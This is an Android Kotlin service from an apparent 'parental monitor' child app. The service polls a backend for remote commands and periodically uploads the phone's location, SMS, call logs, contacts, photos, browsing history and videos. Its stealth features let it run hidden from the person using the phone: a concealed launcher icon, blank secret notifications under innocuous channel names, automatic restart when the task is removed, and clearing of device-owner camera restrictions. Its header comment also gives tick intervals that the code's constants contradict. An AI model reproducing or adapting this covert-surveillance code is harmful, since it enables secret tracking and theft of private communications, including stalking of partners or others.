package com.parentalmonitor.child.services

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.parentalmonitor.child.core.AppConstants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * Persistent foreground service.
 *
 * Tick every 5 minutes:
 *   → Location + device status (every tick)
 *   → Remote commands poll (every tick)
 *   → Geofence + app-block rule sync (every tick)
 *
 * Slower tick every 30 minutes (6 × 5-min cycles):
 *   → Call logs, contacts, gallery, browsing history
 */
class TrackingForegroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private lateinit var locationSvc:      LocationService
    private lateinit var deviceSvc:        DeviceService
    private lateinit var commandSvc:       RemoteCommandService
    private lateinit var notificationSvc:  NotificationSyncService
    private lateinit var videoUploadSvc:   VideoUploadService
    private lateinit var smsSvc:           SmsService
    private lateinit var callLogSvc:       CallLogService
    private lateinit var contactsSvc:      ContactsService
    private lateinit var gallerySvc:       GalleryService
    private lateinit var browsingHistSvc:  BrowsingHistoryService

    private var slowTick = 0
    private var loopStarted = false

    override fun onCreate() {
        super.onCreate()
        AppConstants.init(this)   // resolve backend URL from prefs before services capture it
        locationSvc     = LocationService(this)
        deviceSvc       = DeviceService(this)
        commandSvc      = RemoteCommandService(this, AppConstants.backendBaseUrl)
        notificationSvc = NotificationSyncService(this, AppConstants.backendBaseUrl)
        videoUploadSvc  = VideoUploadService(this, AppConstants.backendBaseUrl)
        smsSvc          = SmsService(this, AppConstants.backendBaseUrl)
        callLogSvc      = CallLogService(this)
        contactsSvc     = ContactsService(this)
        gallerySvc      = GalleryService(this)
        browsingHistSvc = BrowsingHistoryService(this)
        isRunning       = true
        clearDpmCameraPolicy()
        migrateLauncherHide()
    }

    // Ensure non-Samsung devices always have the package and LauncherAlias enabled.
    // Previous builds disabled the alias or even the full package — restore both so
    // the stealth-flag approach (MainActivity immediate finish) works correctly.
    private fun migrateLauncherHide() {
        if (android.os.Build.MANUFACTURER.equals("samsung", ignoreCase = true)) return
        val pm = packageManager
        if (pm.getApplicationEnabledSetting(packageName) ==
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            android.util.Log.i(TAG, "Migration: re-enabling previously disabled package")
            pm.setApplicationEnabledSetting(packageName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP)
        }
        val aliasName = "com.parentalmonitor.child.LauncherAlias"
        val aliasComponent = android.content.ComponentName(packageName, aliasName)
        if (pm.getComponentEnabledSetting(aliasComponent) ==
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
            android.util.Log.i(TAG, "Migration: re-enabling previously disabled LauncherAlias")
            pm.setComponentEnabledSetting(aliasComponent,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP)
        }
    }

    // Samsung Knox automatically sets camera/screenshot restrictions when the app registers
    // as Device Owner via ADB. Clear ALL three blocking mechanisms on every service start.
    private fun clearDpmCameraPolicy() {
        try {
            val dpm = getSystemService(android.app.admin.DevicePolicyManager::class.java)
                ?: return
            if (!dpm.isDeviceOwnerApp(packageName)) return
            val admin = android.content.ComponentName(
                this, com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java)
            val um = getSystemService(android.os.UserManager::class.java) ?: return

            if (dpm.getCameraDisabled(null)) {
                dpm.setCameraDisabled(admin, false)
                android.util.Log.i(TAG, "Startup: cleared DPM setCameraDisabled policy")
            }
            if (um.hasUserRestriction("no_camera")) {
                dpm.clearUserRestriction(admin, "no_camera")
                android.util.Log.i(TAG, "Startup: cleared DISALLOW_CAMERA user restriction")
            }
            if (um.hasUserRestriction("no_screenshots")) {
                dpm.clearUserRestriction(admin, "no_screenshots")
                android.util.Log.i(TAG, "Startup: cleared DISALLOW_SCREENSHOT user restriction")
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "clearDpmCameraPolicy: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val fgsType = if (hasLocationPermission())
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        else
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC

        when (intent?.action) {
            ACTION_STEALTH -> {
                // Parent hid the icon — mark stealth in prefs, switch to silent notification.
                getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                    .edit().putBoolean("flutter.pm_stealth_mode", true).apply()
                createSilentNotificationChannel()
                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
                if (!loopStarted) { loopStarted = true; startLoop() }
                return START_STICKY
            }
            ACTION_SHOW -> {
                // Parent showed the icon — clear stealth flag, restore normal notification.
                getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                    .edit().putBoolean("flutter.pm_stealth_mode", false).apply()
                createNotificationChannel()
                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
                if (!loopStarted) { loopStarted = true; startLoop() }
                return START_STICKY
            }
        }

        // Default start — check if we were previously in stealth mode (service restarted by OS).
        val wasInStealth = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
            .getBoolean("flutter.pm_stealth_mode", false)
        if (wasInStealth) {
            createSilentNotificationChannel()
            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildSilentNotification(), fgsType)
        } else {
            createNotificationChannel()
            ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(), fgsType)
        }
        if (!loopStarted) { loopStarted = true; startLoop() }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        scope.cancel()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart()
        super.onTaskRemoved(rootIntent)
    }

    // ── Main capture loop ─────────────────────────────────────────────────────

    private fun startLoop() {
        // Fast command loop — lightweight, runs every 10 s
        scope.launch {
            while (isActive) {
                runCommandPoll()
                delay(COMMAND_INTERVAL_MS)
            }
        }

        // Data loop — location/status/sync, runs every 60 s
        scope.launch {
            var firstFullSyncDone = false
            while (isActive) {
                runDataCapture()

                if (!firstFullSyncDone) {
                    // Right after login/start: pull ALL heavy data (call logs,
                    // contacts, gallery, browsing) immediately instead of waiting
                    // for the 6-minute slow cycle. runSlowCapture() returns false
                    // if auth isn't ready yet, so we retry on the next 60 s tick.
                    if (runSlowCapture()) {
                        firstFullSyncDone = true
                        slowTick = 0
                    }
                } else {
                    slowTick++
                    if (slowTick >= SLOW_EVERY_N_TICKS) {
                        slowTick = 0
                        runSlowCapture()
                    }
                }

                delay(FAST_INTERVAL_MS)
            }
        }

        // Live-location loop — only active while a parent has requested live
        // tracking (RemoteCommandService writes an "until" timestamp). Idle-cheap:
        // just a prefs read every tick when not streaming.
        scope.launch {
            while (isActive) {
                val until = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                    .getLong("flutter.$KEY_LIVE_LOCATION_UNTIL", 0L)
                if (System.currentTimeMillis() < until) {
                    safeRun { locationSvc.captureLocation() }
                    val (token, deviceId) = readAuth()
                    if (token != null && deviceId != null) {
                        safeRun { locationSvc.syncLocation(token, deviceId, AppConstants.backendBaseUrl) }
                    }
                }
                delay(LIVE_LOCATION_INTERVAL_MS)
            }
        }
    }

    /** Runs every 10 s — ONLY remote commands (fast, lightweight) */
    private suspend fun runCommandPoll() {
        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.pollAndExecute(token, deviceId) }
        }
    }

    /** Runs every 60 s — location, device status, sync rules, SMS */
    private suspend fun runDataCapture() {
        safeRun { locationSvc.captureLocation() }
        safeRun { deviceSvc.captureStatus() }

        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.syncGeofences(token, deviceId) }
            safeRun { commandSvc.syncAppBlocks(token, deviceId) }
            safeRun { notificationSvc.uploadPending(token, deviceId) }
            safeRun { smsSvc.syncSms(token, deviceId) }
        }
    }

    /**
     * Runs every ~6 minutes (and once immediately after login) — heavier content
     * providers, all native Kotlin (no Flutter needed).
     *
     * @return true if auth was available and the sync ran; false if it was skipped
     *         (no token yet), so the caller can retry on the next tick.
     */
    private fun runSlowCapture(): Boolean {
        android.util.Log.i(TAG, "── Slow cycle: starting native data sync ──")

        // Signal Flutter's MonitoringService in case Flutter is in the foreground.
        getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
            .edit()
            .putLong("flutter.$KEY_SLOW_CYCLE_TS", System.currentTimeMillis())
            .apply()

        val (token, deviceId) = readAuth()
        if (token == null || deviceId == null) {
            android.util.Log.w(TAG, "Slow cycle SKIP — no auth token/deviceId in SharedPreferences")
            return false
        }
        android.util.Log.d(TAG, "Slow cycle syncing for device $deviceId")

        safeRun { locationSvc.syncLocation(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { smsSvc.syncSms(token, deviceId) }
        safeRun { callLogSvc.syncCallLogs(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { contactsSvc.syncContacts(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { gallerySvc.syncGallery(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { browsingHistSvc.syncBrowsingHistory(token, deviceId, AppConstants.backendBaseUrl) }
        safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }

        android.util.Log.i(TAG, "── Slow cycle: done ──")
        return true
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // v2 channel ID forces a fresh channel — old pm_tracking_channel cached IMPORTANCE_LOW
            // and Android ignores importance changes on existing channel IDs.
            val channel = NotificationChannel(
                CHANNEL_ID, "Device Management", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createSilentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_SILENT_ID, "Background Processing", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setWhen(0)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    private fun buildSilentNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_SILENT_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setShowWhen(false)
            .setWhen(0)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    // ── Restart insurance ─────────────────────────────────────────────────────

    private fun scheduleRestart() {
        val restartIntent = PendingIntent.getService(
            this, 1,
            Intent(applicationContext, TrackingForegroundService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
        )
        (getSystemService(ALARM_SERVICE) as AlarmManager).set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1_000L,
            restartIntent,
        )
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun readAuth(): Pair<String?, String?> {
        val prefs  = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
        val token  = prefs.getString("flutter.pm_token", null)
        val devId  = prefs.getString("flutter.pm_device_id", null)
        return Pair(token, devId)
    }

    private fun hasLocationPermission(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private inline fun safeRun(block: () -> Unit) {
        try { block() } catch (_: Exception) {}
    }

    companion object {
        @Volatile var isRunning = false

        const val PREFS_TRACKING    = "pm_tracking"
        const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"
        const val KEY_LIVE_LOCATION_UNTIL = "pm_live_location_until"
        const val ACTION_STEALTH    = "com.parentalmonitor.child.ACTION_STEALTH"
        const val ACTION_SHOW       = "com.parentalmonitor.child.ACTION_SHOW"

        private const val TAG                = "TrackingFgService"
        // v2 IDs: old channels were cached with wrong importance; fresh IDs get fresh settings.
        private const val CHANNEL_ID         = "pm_tracking_v2"
        private const val CHANNEL_SILENT_ID  = "pm_tracking_silent_v2"
        private const val NOTIFICATION_ID    = 1001
        private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
        private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
        private const val SLOW_EVERY_N_TICKS = 6                 // every 6 min
        private const val LIVE_LOCATION_INTERVAL_MS = 10 * 1_000L // 10 s — live location stream
    }
}
